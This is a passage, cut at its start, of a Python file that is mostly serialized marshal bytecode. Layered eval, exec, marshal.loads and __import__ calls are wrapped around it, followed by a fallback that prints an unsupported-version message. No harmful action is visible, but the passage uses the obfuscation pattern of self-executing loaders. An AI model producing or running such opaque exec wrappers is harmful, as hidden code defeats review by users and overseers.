x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00N)\tZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x04exec\xda\n__import__\xda\x06decoder\x03\x00\x00\x00r\x03\x00\x00\x00r\x03\x00\x00\x00r\x06\x00\x00\x00\xda\x08<module>\x02\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02s\xd3\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00g\x00d\x00\xa2\x01\x83\x01\xa0\x01\xa1\x00S\x00)\x01)\x15\xe9#\x00\x00\x00\xe9 \x00\x00\x00\xe9n\x00\x00\x00\xe9o\x00\x00\x00r\x01\x00\x00\x00\xe9s\x00\x00\x00\xe9u\x00\x00\x00\xe9p\x00\x00\x00r\x06\x00\x00\x00r\x03\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x01\x00\x00\x00\xe9f\x00\x00\x00r\x03\x00\x00\x00r\x07\x00\x00\x00r\x01\x00\x00\x00\xe9"\x00\x00\x00\xe9%\x00\x00\x00r\x04\x00\x00\x00r\n\x00\x00\x00)\x02\xda\x05bytes\xda\x06decode\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x01 )\x0cZ\x03fooZ\x03bar\xda\x04eval\xda\x07marshal\xda\x05loads\xda\tcopyright\xda\x03sys\xda\x07version\xda\x04exec\xda\x05printZ\x05feval\xda\x05split\xa9\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xda\x06string\xda\x08<module>\x02\x00\x00\x00s\x10\x00\x00\x00\x04\x01\x04\x01\x08\x01\x0e\x01\x08\x01\x08\x02\x1c\x01\x10\x02'))
else:
    print(f'# no support for "%s"' % sys.version.split(" ")[0])